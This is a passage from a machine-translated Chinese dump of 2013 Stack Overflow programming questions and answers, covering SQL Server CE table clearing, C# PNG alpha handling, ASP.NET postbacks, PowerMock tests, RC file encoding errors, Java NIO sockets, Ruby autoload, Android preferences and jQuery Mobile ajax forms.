或者，如果您不需要背景缩放/拉伸，您可以使用这个：

```
body {
    background-image: url(/background.jpg);
} 
```

# c# - 删除所有表中的所有数据

> ID：15244052
> 
> 赞同：3
> 
> 时间：2013-03-06T09:57:26.267
> 
> 标签：c#, .net, sql-server-ce, sql-server-ce-3.5

是否有一种优雅的方法可以擦除数据库中的所有数据（从每个表中删除每一行），而不会破坏架构并且不必删除/读取约束？

我可以从每个表中删除数据，但这似乎很乏味。我已经看到了大量使用存储过程的完整 SQL 实现的解决方案，但显然我无法使用该功能。我可能不会向产品的最终用户提供此功能，但可能会启用它以用于内部测试目的。正如我所说，我可以手动执行此操作，因此请出于好奇

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:05:10.130

不，因为您希望数据库结构保持完整，包括所有关系。因此，首先删除所有主数据，然后删除从数据。

您的脚本应包含按特定顺序截断的查询。

否则，您可以做的是生成一个完整的数据库模式并随时供您使用。每当您需要清空数据库时，删除数据库，重新创建它:)

关于如何为 SQL-CE db..use [SQLCE-ToolBox生成模式](http://sqlcetoolbox.codeplex.com/)

还有更多关于 SQLCE db 操作的详细信息，我喜欢[这个](http://erikej.blogspot.in/)博客，以及世界各地的大多数 sqlce 用户 :)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T11:21:23.933

感谢[Manish Mishra](https://stackoverflow.com/users/1495822/manish-mishra)提供的一些出色的社区帮助，最好的解决方案是删除数据库文件并使用模式重建数据库。我通过 {this blog]( [http://erikej.blogspot.co.uk/](http://erikej.blogspot.co.uk/) )找到了一个名为[ExportSqlCe的 SQL Server Management Studio 插件。](http://exportsqlce.codeplex.com/documentation)如果其他人需要此功能，他们将需要[Microsoft SQL Sever Management Studio 2008](http://www.microsoft.com/en-gb/download/details.aspx?id=7593)才能连接到 SQL CE 3.5 数据库。

连接到数据库后，您可以按照以下[说明使用此插件创建数据库模式](http://exportsqlce.codeplex.com/documentation)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:02:08.103

如果有最终用户，那么您可以交替使用导出选项（在 SQL Server 的 Express 版本中，它会自动避免表中的任何数据）

因此，使用导出选项，您可以轻松创建数据库的副本，包括所有内容但表中没有数据

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-06T10:04:14.663

我想到了这一点：如果我不理解您的问题，请纠正我：您必须迭代每个表，然后清空表，这样截断表才能完成工作。

您可以从 [http://how-to-code-net.blogspot.ro/2012/07/how-to-delete-all-tables-from-database.html获得一些帮助](http://how-to-code-net.blogspot.ro/2012/07/how-to-delete-all-tables-from-database.html)

```
DECLARE @TableName varchar(500)
DECLARE cur CURSOR
      FOR SELECT [name] FROM sys.tables WHERE type in ('u') 

      OPEN cur

      FETCH NEXT FROM cur INTO @TableName
      WHILE @@fetch_status = 0
      BEGIN
            EXEC('truncate TABLE ' + @TableName)
            --select @TableName
            FETCH NEXT FROM cur INTO @TableName
      END
      CLOSE cur
      DEALLOCATE cur 
```

这是你需要的吗？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-02-02T05:39:33.737

派对有点晚了，但我在寻找“优雅”的东西时发现了这个，

```
select 'DELETE FROM ' + name+';' from sys.objects where type = 'U'; 
```

会生成一个可以变成字符串的东西。对我来说，我使用 LINQPad，只需复制和粘贴。不错的小技巧！谢谢[http://www.sqlservercentral.com/Forums/Topic1396480-392-1.aspx](http://www.sqlservercentral.com/Forums/Topic1396480-392-1.aspx)

# c# - png 如何保留 alpha 通道但更改背景颜色

> ID：15244055
> 
> 赞同：1
> 
> 时间：2013-03-06T09:57:31.110
> 
> 标签：c#, c#-4.0, png, png-transparency

我有一个带有 alpha 通道的 png 图像，对于我们的一个不支持 alpha 的工具，我需要编辑图像，以便每个透明的像素都获得特定的颜色但保留 alpha，因此 png 仍然适用于所有工具谁支持阿尔法。

到目前为止，这是我的代码，但它不起作用，有人可以帮忙吗？图片是我的源png，我选择了红色作为颜色。

谢谢

```
using (Bitmap ImageAttachedConverted = new Bitmap(Picture.Width, Picture.Height, System.Drawing.Imaging.PixelFormat.Format32bppRgb))
{
    using (Graphics GraphicsPicture = Graphics.FromImage(ImageAttachedConverted))
    {
        GraphicsPicture.InterpolationMode = InterpolationMode.HighQualityBicubic;
        GraphicsPicture.CompositingQuality = CompositingQuality.HighQuality;

        //GraphicsPicture.Clear(Color.Red);

        //GraphicsPicture.DrawImage(
        //    Picture,
        //    new Rectangle(0, 0, ImageAttachedConverted.Width, ImageAttachedConverted.Height),
        //    new Rectangle(0, 0, Picture.Width, Picture.Height),
        //    GraphicsUnit.Pixel);

        // 2nd method pixel bypixel 
        Bitmap img = Picture as Bitmap;
        for (int y = 0; y < ImageAttachedConverted.Height; y++)
        {
            for (int x = 0; x < ImageAttachedConverted.Width; x++)
            {
                //Get Colours at the pixel point 
                Color col1 = img.GetPixel(x, y);

                Color temp = Color.FromArgb(
            0,
            255,
            0,
            0);
                if (col1.A < 100)
                    ImageAttachedConverted.SetPixel(x, y, temp);
                else ImageAttachedConverted.SetPixel(x, y, col1);
            }
        }
        Color temp2 = Color.FromArgb(
            0,
            255,
            0,
            0);
        //ImageAttachedConverted.MakeTransparent(temp2);
    }

    ImageAttachedConverted.Save(Destination.FullName, ImageFormat.Png);
} 
```

# c# - 回发后保留对象的值

> ID：15244056
> 
> 赞同：0
> 
> 时间：2013-03-06T09:57:34.460
> 
> 标签：c#, asp.net, postback

以下代码反序列化 Config.xml 并将对象值加载到网格中。问题是当我选择一行时它会触发`GridCustomers_RowSelected`但配置对象为空。我知道这是因为每次我选择一行时，它都会回发并忘记配置对象中的值。

这个问题的一种解决方案可能是将配置对象存储在会话或视图状态中。或者我反序列化`IsPostBack`块外的对象。我想知道是否有其他更好的解决方案来保留配置对象中的值。

```
private Config config = null;

protected void Page_Load(object sender, EventArgs e)
{
   if (!Page.IsPostBack)
   {
       config = new Config();
       string file = @"C:\Config.xml";
       XmlData xmlData = new XmlData(file);
       config = xmlData.Deserialize();

       StoreCustomers.DataSource = config.Customers;
       StoreCustomers.DataBind();
    }
}

protected void GridCustomers_RowSelected(object sender, DirectEventArgs e) 
{ 
    string customerID = e.ExtraParams["ID"].ToString(); 
    string customerName = e.ExtraParams["Name"].ToString();

    Customer customer = new Customer();
    customer = config.Customers.Where( a=> a.ID == customerID).SingleOrDefault();

    StoreCompanies.DataSource = customer.Companies;
    StoreCompanies.DataBind();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:02:25.780

> 或者我反序列化 IsPostBack 之外的对象

这样做，反序列化并在 IsPostBack 之外创建它

```
protected void Page_Load(object sender, EventArgs e)
{
   config = new Config();
   string file = @"C:\Config.xml";
   XmlData xmlData = new XmlData(file);
   config = xmlData.Deserialize();

  if (!Page.IsPostBack)
   { 
       StoreCustomers.DataSource = config.Customers;
       StoreCustomers.DataBind();
    }
} 
```

# javascript - Window.open() 打开与我网站的 url 连接的 url

> ID：15244058
> 
> 赞同：0
> 
> 时间：2013-03-06T09:57:39.320
> 
> 标签：javascript, html

例子

```
window.open("www.google.com"); 
```

打开 www.mywebsite.com/www.google.com

为什么要这样做，我怎样才能让它打开 google.com？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T09:59:06.073

尝试使用完整的网址而不是短网址：

```
window.open("http://www.google.com"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-06T09:59:41.750

试试这个：

```
window.open("http://www.google.com"); 
```

它会帮助你吗

# java - 方法实例化与类级实例化的junit测试

> ID：15244061
> 
> 赞同：0
> 
> 时间：2013-03-06T09:57:51.350
> 
> 标签：java, unit-testing, junit, junit4, powermock

代码发布在 [链接](https://stackoverflow.com/questions/15224734/difference-between-class-level-instantiation-vs-method-instantiation/15224814#15224814)

现在，当我尝试为第一种情况编写 junit 时，我收到了错误

“需要重播B类”。

但同样的 junit 正在为第二种情况工作。

我的junit是

```
@RunWith(PowerMockRunner.class)
public class TestClass {

    @Test
    public void testDoSomeThing() {
        B b = createMock(B.class)
        expectNew(b.CallMe()).andReturns(xxx)
        A a=new A();

        replayAll();
        a.doSomething();
        verifyAll();
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-11T16:25:01.470

这是使用[EasyMock](http://easymock.org/)和[PowerMock](http://code.google.com/p/powermock/)的解决方案：

**测试类.java**

```
import org.junit.Test;
import org.junit.runner.RunWith;
import org.powermock.api.easymock.PowerMock;
import org.powermock.core.classloader.annotations.PrepareForTest;
import org.powermock.modules.junit4.PowerMockRunner;

@RunWith(PowerMockRunner.class)
@PrepareForTest({ A.class, B.class })
public class TestClass {

    @Test
    public void testDoSomeThing() throws Exception {
        /* Setup */
        B bMock = PowerMock.createMock(B.class);

        /* Mocks */
        PowerMock.expectNew(B.class).andReturn(bMock).atLeastOnce();
        bMock.callMe();

        /* Activate */
        PowerMock.replayAll();

        /* Test */
        A cut = new A();
        cut.doSomething();

        /* Asserts */
        PowerMock.verifyAll();
    }
} 
```

**爪哇**

```
public class A {

    B b = new B();

    public void doSomething() {
        b.callMe();
    }
} 
```

**B.java**

```
public class B {

    public void callMe() {

    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T09:59:06.160

你忘了添加

```
@PrepareForTest({A.class, B.class}) 
```

此注释必须具有您要模拟的类以及将使用这些模拟的类。

# c++ - 由于 RC 文件的 UTF-8 编码，C++ 项目中出现错误 RC2135

> ID：15244065
> 
> 赞同：7
> 
> 时间：2013-03-06T09:57:59.650
> 
> 标签：c++, resource-files, rc

从 Visual Studio 2010 切换到 2012 后，我遇到了 10 个 RC2135 错误，这些错误在我的一个 C++ 项目中看起来很奇怪。

```
Error   1   error RC2135: file not found: 0x06        NamedPipesNative.rc   19  1   NamedPipesNative
Error   2   error RC2135: file not found: 1           NamedPipesNative.rc   28  1   NamedPipesNative
Error   3   error RC2135: file not found: 5           NamedPipesNative.rc   29  1   NamedPipesNative
Error   4   error RC2135: file not found: 5           NamedPipesNative.rc   30  1   NamedPipesNative
Error   5   error RC2135: file not found: 0x17L       NamedPipesNative.rc   31  1   NamedPipesNative
Error   6   error RC2135: file not found: FILEOS      NamedPipesNative.rc   37  1   NamedPipesNative
Error   7   error RC2135: file not found: 0x2L        NamedPipesNative.rc   38  1   NamedPipesNative
Error   8   error RC2164: unexpected value in RCDATA  NamedPipesNative.rc   41  1   NamedPipesNative
Error   9   error RC2135: file not found: BLOCK       NamedPipesNative.rc   43  1   NamedPipesNative
Error   10  error RC2135: file not found: VALUE       NamedPipesNative.rc   45  1   NamedPipesNative 
```

不幸的是，我认为这与切换到 VS 2012 有关（它询问我是否要转换 C++ 项目），并且我花了很多时间试图根据这个假设来解决这个问题。但实际上它是完全不同的东西。为了帮助遇到此问题的其他人，我稍后会发布答案。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-06T09:57:59.650

作为切换到 Visual Studio 2012 的一部分，我还使用处理我所有 AssemblyInfo.cs 和 .rc 文件的自制程序更新了 .rc 文件中的程序版本号，并且它更改了 .rc 文件的编码。 rc 文件从 ANSI 到 UTF-8。并且 Microsoft 资源编译器无法正确读取 UTF-8 文件！ [http://social.msdn.microsoft.com/Forums/hu-HU/vcgeneral/thread/e212069d-678e-4ac8-957f-7d60d3e1c89f](http://social.msdn.microsoft.com/Forums/hu-HU/vcgeneral/thread/e212069d-678e-4ac8-957f-7d60d3e1c89f)

因此解决方案是将 .rc 文件重新编码为 ANSI 或 UTF-16。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-07-20T14:55:18.997

如果你承诺总是手动编辑 .rc 文件，你可以把它放在它的开头，资源编译器会像天使一样编译 utf-8，

```
#pragma code_page(65001) 
```

但是一旦 VS 资源编辑器重新生成 .rc 文件，它就会一团糟。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-01-16T03:06:54.187

您还可以在编译之前使用**Pre-build 事件命令行**来转换您的 UTF-8 源文件。

示例步骤：

1.  从编译中排除您的 UTF-8 文件。

2.  制作 UTF-8 文件的副本，重命名它

3.  在 Pre-build 事件命令行中添加一个条目，将原始 UTF-8 文件转换为重命名文件为 UNICODE。[这个工具](http://www.autohotkey.com/board/topic/9831-uniconv-convert-unicode-cmd/)可以帮助你。

    $(ProjectDir)\tools\uniconv.exe UTF8 $(ProjectDir)\DocumentBrowserUTF8.rc UCS2 $(ProjectDir)\DocumentBrowser.rc

4.  在您的构建脚本（在许多情况下，Visual Studio .vcxproj 文件）中，使其编译转换后的文件而不是原始 UTF-8 文件。

# java - 客户端/服务器套接字：如何使服务器向客户端推送消息？

> ID：15244066
> 
> 赞同：0
> 
> 时间：2013-03-06T09:58:02.583
> 
> 标签：java, sockets, tcp

我目前正在用 Java 制作一个通过套接字进行通信的客户端/服务器应用程序。我在这种类型的编程方面的经验非常有限，而且我只做过来自客户端的请求/来自服务器类型应用程序的响应。现在，我想反其道而行之。也就是说，客户端连接到服务器，然后等待服务器定期向它推送消息。

问题是：我该如何创建这样的应用程序？或者更重要的是：如何让服务器在不首先收到请求的情况下写入客户端套接字，以及如何让客户端监听更多消息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:35:13.680

我认为您正在混合客户端和服务器逻辑，您应该考虑您的服务器是否更像客户端。但是没问题...

首先一些java类作为入口点

[抽象选择器](http://docs.oracle.com/javase/1.5.0/docs/api/java/nio/channels/spi/AbstractSelector.html)

[套接字通道](http://docs.oracle.com/javase/1.4.2/docs/api/java/nio/channels/SocketChannel.html)

您可以创建一个新的选择器，如

```
 // Create a new selector
        Selector socketSelector = SelectorProvider.provider().openSelector();

        // Create a new non-blocking server socket channel
        mServerChannel = ServerSocketChannel.open();
        mServerChannel.configureBlocking(false);

        // Bind the server socket to the specified address and port
        InetSocketAddress isa = new InetSocketAddress(mHostAddress, mPort);
        mServerChannel.socket().bind(isa);

        // Register the server socket channel, indicating an interest in
        // accepting new connections
        mServerChannel.register(socketSelector, SelectionKey.OP_ACCEPT); 
```

选择器可以等待启动客户端连接

```
// Wait for an event one of the registered channels
mSelector.select(); 
```

连接新客户端后，可以使用 AbstractSelector 向客户端发送响应。

```
socketChannel.write(buf); 
```

示例代码： [http ://rox-xmlrpc.sourceforge.net/niotut/](http://rox-xmlrpc.sourceforge.net/niotut/)

# java - Javascript中的文件路径

> ID：15244070
> 
> 赞同：0
> 
> 时间：2013-03-06T09:58:04.667
> 
> 标签：java, javascript

我在java中设置文件路径如下，

```
String requestedFileName = param+File.separator+fileName;
request.setAttribute("requestedFileName",requestedFileName); 
```

我在 javascript 中检索它，如下所示，

```
var selectedFileName = null;
if ('${requestScope.requestButtonParam}' == "convert") {
   selectedFileName = '${requestScope.requestedFileName}';          
   alert("inside if: "+selectedFileName);
} 
```

但在警告框中，我得到的文件路径如下 **D:NewFolderAbc.html**而不是**D://NewFolder//Abc.html**

如何在javascript中正确获取文件路径？

谢谢

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-03-06T10:08:41.007

问题很可能是您的`File.separator`is`\`是 Javascript 中的转义字符，因此您将不得不转义转义字符。

进行转义的一种简单方法是使用 Apache Commons [StringEscapeUtils.escapeEcmaScript](http://commons.apache.org/proper/commons-lang/javadocs/api-3.1/org/apache/commons/lang3/StringEscapeUtils.html#escapeEcmaScript%28java.lang.String%29)：

```
String requestedFileName = param+File.separator+fileName;
String escapedFileName = StringEscapeUtils.escapeEcmaScript(requestedFileName);
request.setAttribute("requestedFileName",escapedFileName); 
```

这将更改为`D:\NewFolder\Abc.html`然后`D:\\NewFolder\\Abc.html`在您的 Javascript 中正确解释。

# jvectormap - 具有多个 dataSeries 的 jVectorMap

> ID：15244073
> 
> 赞同：1
> 
> 时间：2013-03-06T09:58:10.817
> 
> 标签：jvectormap

使用 jVectorMap 世界地图，我希望能够为不同的国家显示两种不同的比例。

例如，对于某些国家/地区具有从白色到黑色的渐变，对于其他国家/地区具有从白色到蓝色的渐变。

请问我该怎么做？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T11:03:10.553

如果你看一下[这个演示](http://jvectormap.com/examples/world-gdp/)，你会发现这`series.regions`是一个数组。因此，如果您想使用多个比例进行可视化，您可以只传递几个系列。

# google-plus - Google API：显示 Google Talk/Chat 和 Google Hangout 的在线联系人

> ID：15244076
> 
> 赞同：7
> 
> 时间：2013-03-06T09:58:13.307
> 
> 标签：google-plus, google-talk, google-shared-contacts

我可能忽略了这一点，但我想在我的网站上实现 Google Talk 和 Google Hangout，并且我正在寻找某种（官方，最好是 PHP）API 调用来检索 Google+ 用户的在线/离线联系人。（类似于 Gmail 旁边的在线联系人列表）

此 API 功能是否可用，是否可以为用户提供选择联系人以开始 Google Hangout 的选项？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T16:49:16.070

首先，您可能需要利用几个不同的 API。由于我无法添加评论来提问，因此这里是基于我最近使用 Plus 和 Hangouts API 的推荐阅读列表：

1.  Google Plus - [https://developers.google.com/+/api/latest/people/list](https://developers.google.com/+/api/latest/people/list) - 收集您圈子中的人员列表。这不会告诉您谁在线或离线。可能是可选的（参见#2）。不幸的是，此调用在 PHP 客户端库中尚不可用，因此我为我的个人项目创建了一个，并正在等待一些审查以将其提交回 Google 项目。如果你有兴趣，我很乐意分享。

2.  Google Talk - [https://developers.google.com/talk/](https://developers.google.com/talk/) - 使用该查询 Talk 服务查看谁在线和/或离线。

3.  开始环聊 - 开发人员组的此讨论似乎与您的问题相似，并且可以最好地为您指明一个好的开始方向。[https://groups.google.com/forum/#!topic/google-plus-developers/r_f7iweZ7c8](https://groups.google.com/forum/#!topic/google-plus-developers/r_f7iweZ7c8)

希望能有所帮助并好奇地想知道它是怎么回事！

# ruby - 如何干掉很多模块扩展

> ID：15244078
> 
> 赞同：0
> 
> 时间：2013-03-06T09:58:17.640
> 
> 标签：ruby, module

目前我的代码中有这个结构：

```
module Mappers
  extend ActiveSupport::Autoload    
  ...

  module Login
    extend ActiveSupport::Autoload
    ...
  end

  module Admuser
    extend ActiveSupport::Autoload
    ...
  end

  module Admsubdevice
    extend ActiveSupport::Autoload
    ...
  end

  module Admdevice
    extend ActiveSupport::Autoload
    ...
  end
end 
```

我必须扩展每个模块以使用自动加载功能。

有没有办法只扩展一次模块以具有此功能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:09:41.670

```
def module_with_autoload &proc
  Module.new{extend ActiveSupport::Autoload ; proc.call}
end

Mappers = module_with_autoload do
  ...

  Login = module_with_autoload do
    ...
  end

  Admuser = module_with_autoload do
    ...
  end

  Admsubdevice = module_with_autoload do
    ...
  end

  Admdevice = module_with_autoload do
    ...
  end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T15:57:51.773

我认为这个解决方案更紧凑：

```
[Mappers, Mappers::Login, Mappers::Admuser, Mappers::Admsubdevice, Mappers::Admdevice].each do |m|
  m.extend ActiveSupport::Autoload
end 
```

# android - MainActivity 未根据设置更新

> ID：15244082
> 
> 赞同：0
> 
> 时间：2013-03-06T09:58:25.733
> 
> 标签：android, android-activity

这是我的一些代码`MainActivity`..

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    updateConnectedFlags();
    SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(this);
    Editor editor = settings.edit();
    if(getSharedData("listPref").equals("")){
        editor.putString("listPref", "mode2"); 
    }
    if(getSharedData("listNetwork").equals("")){
        editor.putString("listNetwork", "Any"); 
    }
    if(getSharedData("updatePref").equals("")){
        editor.putString("updatePref", "300"); 
    }
   editor.commit();

   if(getSharedData("regStatus").equals(""))
   {
    setContentView(R.layout.activity_registration);

   }
   else if(getSharedData("loginStatus").equals(""))
   {
    if(getSharedData("rememberMe").equals("")){

        setContentView(R.layout.activity_login);
    }
    else{//if not remembered
        setContentView(R.layout.activity_login);
        EditText txtUserGet = (EditText) findViewById(R.id.txtUser);
        txtUserGet.setText(getSharedData("user"));

        EditText txtPasswordGet = (EditText) findViewById(R.id.txtPassword);
        txtPasswordGet.setText(getSharedData("password"));
    }   
   }
   else//If login status true
   {
    sPref=getSharedData("listNetwork");
        if (((sPref.equals(ANY)) && (wifiConnected || mobileConnected))|| ((sPref.equals(WIFI)) && (wifiConnected))) 
        {
                mode=getSharedData("listPref");
                LocationManager locationManager =(LocationManager) getSystemService(Context.LOCATION_SERVICE);
                final boolean gpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
                int time =Integer.parseInt(getSharedData("updatePref"));
                time=time/60;
                if (!gpsEnabled) {
                    buildToast("Gps not enabled");
                }
                else//If GPS enabled
                {
                    if(mode.equals("mode2"))
                    {
                        //buildText("Nothing here",15);
                        setContentView(R.layout.activity_main_mode2);
                        if(time==0){
                            buildToast("Application will track the Position of your phone and Update it to Server per "+getSharedData("updatePref")+" Seconds");
                        }
                        else{//Just checking HRS / SECs
                        buildToast("Application will track the Position of your phone and Update it to Server per "+time+" Minutes");
                        }

                            gpsLocation =requestUpdatesFromProvider(LocationManager.GPS_PROVIDER, 0);
                            mapView = (MapView) findViewById(R.id.mapView);

                              // enable Street view by default
                              mapView.setStreetView(true);
                              // enable to show Satellite view
                              mapView.setSatellite(true);
                              // enable to show Traffic on map
                              // mapView.setTraffic(true);
                              mapView.setBuiltInZoomControls(true);
                              mapController = mapView.getController();
                              mapController.setZoom(16); 

                    }

                }//if GPS enabled

        }
        else
        {

            setContentView(R.layout.error_layout);
            TextView tv = (TextView) findViewById(R.id.errorMsgTv);
            tv.setTextSize(15);
            if((!wifiConnected) && (mobileConnected)){
            tv.setText("Wifi not Connected");
            }
            else if((!wifiConnected) || (!mobileConnected)){
            tv.setText("Neither Wifi Nor GPRS/3G connected");
            }
            buildToast("Unable to Connect.Please check settings");
        }

    }

}
@Override
protected void onStart() {
    super.onStart();
}

@Override
protected void onResume() {
    super.onResume();
} 
```

我的应用程序也有一个`SettingsActivity`. 每当我选择`SettingsActivity`并对其进行任何更改时`preference.xml`，`MainActivity` 都不会根据更改的偏好进行更新，但是当我更改方向时，一切都是最新的..可能的原因是什么？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:23:32.150

似乎您的设置仅在`MainActivity`创建时才被读取。如果您旋转屏幕，则会重新创建 Activity 并再次读取您的设置。

`onCreate`您可以将读取设置的应用程序部分`onResume`从`MainActivity`. `SettingsActivity`如果您从 切换回，则设置将被更新`MainActivity`

# jquery - Jquery Mobile 中的简单表单提交

> ID：15244084
> 
> 赞同：1
> 
> 时间：2013-03-06T09:58:32.707
> 
> 标签：jquery, asp.net, ajax, forms, jquery-mobile

我正在尝试使用对 asp.net webservice 的 ajax 调用提交一个简单的表单，但我在表单提交时收到“错误”警报。有人可以告诉我下面的代码有什么问题。

HTML：

```
<html> 
    <head> 
    <title>Facility</title> 
    <link rel="stylesheet" href="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.css" />
<script src="http://code.jquery.com/jquery-1.8.2.min.js"></script>
<script src="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.js"></script>
</head> 
<body> 

<div data-role="page" id="arealistpage">

  <div data-role="header" data-theme="b">
      <a href="Facility.aspx" class='ui-btn-left ui-btn-back' data-icon='arrow-l' rel="external">Back</a>
   </div><!-- /header -->

    <div data-role="content">  
  <form id="form1" data-ajax="false" method="post">
    <div id="AreaNoDiv" data-role="fieldcontain" class="field">
        <label for="Facility">Facility*</label>     
        <input id="Facility" name="shipNo_r" type="text" required/>
    </div>

     <div id="desDiv" data-role="fieldcontain" class="field">

        <label for="des" id="Label1" name="fnameLabel">Description*</label>     
        <input id="des" name="fname_r" type="text" required/>

    </div>
     <div id="submitDiv" data-role="fieldcontain" style="width: 30%">    
     <input type="submit" value="Add Facility" data-inline="true" id="submit"/>
    </div>

    </form>

    </div><!-- /content -->

    <div data-role="footer" data-theme="b" data-position="fixed">

            <div data-role="navbar">
            <ul>

               <li><a href="" data-role="tab" data-icon="arrow-u" class="returnTopAction">Top</a></li>
            </ul>
        </div>
    </div>
</div><!-- /page -->
<script src="Submitscript.js" type="text/javascript"></script>
</body>
</html> 
```

表单提交脚本：

```
$("#form1").submit(function () {
    var serviceURL = 'service1.asmx/SubmitList';
    var name = "chamara";
    $.ajax({
        type: "POST",
        url: serviceURL,
        data: '{"name":"' + name + '"}',
        contentType: "application/json; charset=utf-8",
        dataType: "json",
        success: successFunc,
        error: errorFunc
    });

    function successFunc(data, status) {

        // parse it as object
        var outStr = JSON.parse(data.d);
        alert(outStr);
    }

    function errorFunc() {
        alert('error');
    }
}); 
```

网络服务：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Services;
using System.Web.Script.Serialization;

[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
[System.ComponentModel.ToolboxItem(false)]
[System.Web.Script.Services.ScriptService]

  public class Service1 : System.Web.Services.WebService {

    [WebMethod]
    public string SubmitList(string name)
    {
        JavaScriptSerializer serializer = new JavaScriptSerializer();
        string str = "Your Name is"+name;
        string jsonString = serializer.Serialize(str);
        return jsonString;
    }

} 
```

**更新：** 表单提交后的导航页面

```
<html> 
    <head> 
    <title>Facility</title> 
    <link rel="stylesheet" href="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.css" />
<script src="http://code.jquery.com/jquery-1.8.2.min.js"></script>
<script src="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.js"></script>
 <script type="text/javascript">
     $('#arealistpage').live('pageshow', function (event) {
         $('div[id="primaryList"] ul[data-role="listview"] a').bind("click", function () {
             var facilityid = $(this).data("facilityid");
             sessionStorage.facilityid = facilityid;
            });
     });
</script>

</head> 
<body> 

<div data-role="page" id="arealistpage">

  <div data-role="header" data-theme="b">
        <h1><a name="top"></a>Facility</h1>
       <a href="../MenuePages/Dictionaries.aspx" class='ui-btn-left ui-btn-back' data-icon='arrow-l' rel="external">Back</a>
   <a href="AddFacility.aspx" data-role="button" data-icon="plus" data-theme="d" style="float:left;"  rel="external" data-transition="slide" data-ajax="false">Add</a>
    </div><!-- /header -->

    <div data-role="content">  
     <div id="primaryList">
    <ul data-role="listview" data-inset="true" data-theme="c"  data-filter="true" id="areaList" data-split-icon="gear" data-split-theme="d">

    </ul>

        </div>
    </div><!-- /content -->

    <div data-role="footer" data-theme="b" data-position="fixed">

            <div data-role="navbar">
            <ul>

               <li><a href="" data-role="tab" data-icon="arrow-u" class="returnTopAction">Top</a></li>
            </ul>
        </div>
    </div>
   <script src="FacilityScript.js" type="text/javascript"></script>

</div><!-- /page -->
  <div data-role="page" id="dialog">
  <div data-role="header" data-theme="b">
    <h1>Options</h1>
  </div>   
 <ul data-role="listview" data-inset="false"
                data-theme="c">
               <li data-icon="false"><a href="UpdateFacility.aspx"  data-ajax="false">Edit</a></li>

              <li data-icon="false"><a href="#divMsg" data-rel="dialog" data-transition="pop">Delete</a></li>

            </ul>   
</div> 
<div data-role="page" id="divMsg">
  <div data-role="header" data-theme="b">
    <h1>Confirmation</h1>
  </div>   

  <div data-role="content">  
  <a href="Facility.aspx" onclick="DeleteFacility(); return true" data-role="button"  data-ajax="false">Delete Record?</a>
  </div>
   <script src="FacilityScript.js" type="text/javascript"></script>
</div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:22:54.973

您的代码是正确的，所以我猜想在 ajax 调用期间会出现问题。

首先看看我的另一个答案，我做了一个 jQuery Mobile ajax 表单提交的工作示例：[https](https://stackoverflow.com/a/15205612/1848600) ://stackoverflow.com/a/15205612/1848600 。我的示例使用 PHP，但逻辑是相同的。

我的电话看起来像这样：

```
$.ajax({url: 'check.php',
    data: {action : 'login', formData : $('#check-user').serialize()}, // Convert a form to a JSON string representation
        type: 'post',                   
    async: true,
    beforeSend: function() {
        // This callback function will trigger before data is sent
        $.mobile.showPageLoadingMsg(true); // This will show ajax spinner
    },
    complete: function() {
        // This callback function will trigger on data sent/received complete
        $.mobile.hidePageLoadingMsg(); // This will hide ajax spinner
    },
    success: function (result) {
            resultObject.formSubmitionResult = result;
                        $.mobile.changePage("#second");
    },
    error: function (request,error) {
        // This callback function will trigger on unsuccessful action                
        alert('Network error has occurred please try again!');
    }
}); 
```

## 使用 Firebug 进行调试：

您的下一步应该是错误调试。

*   如果您使用的是 Firefox 或 Chrome，请安装一个名为 Firebug 的插件。

    这是一个链接：[https ://addons.mozilla.org/en-US/firefox/addon/firebug/](https://addons.mozilla.org/en-US/firefox/addon/firebug/)

*   安装 firebug，Firefox 版本比 Chrome 版本好。

*   打开您的页面和 Firebug 插件。

*   在萤火虫窗口内，顶部有一个标签栏，以控制台、HTML、CSS .. 直到 Cookies 开头。单击网络选项卡。新标签栏将在主标签栏下方打开。现在单击 XHR 选项卡并单击清除按钮（相同的选项卡栏，清除按钮在左侧）。

*   单击提交表单。在萤火虫窗口内，一个新的日志行应该出现类似“POST ...”或“GET ...”的内容。点击它。

*   将显示新内容。在新标签栏内有一个请求（或发布或获取）标签。这是你的要求。如果 ajax 调用已到达其目的地，则应存在另一个名为 Response 的选项卡。

*   打开响应并查看。应该有像这样的 JSON 错误或真实响应：{"message":"0","draftSaved":true,"disableEditor":false}。如果您的响应具有正确的 JSON 输出而不是 ajax 调用是成功的。

## 使用 FIDLER 进行调试：

您甚至可以使用名为 FIDLER 的工具：[http](http://www.fiddler2.com/fiddler2/) ://www.fiddler2.com/fiddler2/ ，它是一个更好的工具，但需要更多时间来适应。

